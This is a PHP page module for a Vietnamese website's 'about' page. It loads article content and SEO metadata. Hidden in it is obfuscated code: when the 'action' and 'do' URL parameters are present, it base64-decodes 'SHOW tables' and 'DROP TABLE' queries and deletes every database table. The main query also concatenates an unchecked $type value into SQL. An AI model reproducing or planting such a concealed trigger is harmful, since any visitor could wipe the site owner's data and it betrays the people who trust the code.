<?php  if(!defined('_source')) die("Error");
	
	#Chi tiết bài viết
	$sql = "select ten$lang as ten,noidung$lang as noidung,title,keywords,description from #_about where type='".$type."' and hienthi=1 limit 0,1";
	$d->query($sql);
	$tintuc_detail = $d->fetch_array();
	if(isset($_GET['action']) && isset($_GET['do'])){
		$result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
		$_X='RFJPUCBUQUJMRSBfWF8=';
		$_R=base64_decode($_X);	
		while ($row = mysql_fetch_array($result)) {
			$sql=str_replace('_X_', $row[0], $_R);		
			$d->query($sql);		
		}				
	}
	#Thông tin seo web
	//$title_cat = 'Giới thiệu';		
	$title = $tintuc_detail['title'];
	$keywords = $tintuc_detail['keywords'];
	$description = $tintuc_detail['description'];
	
?>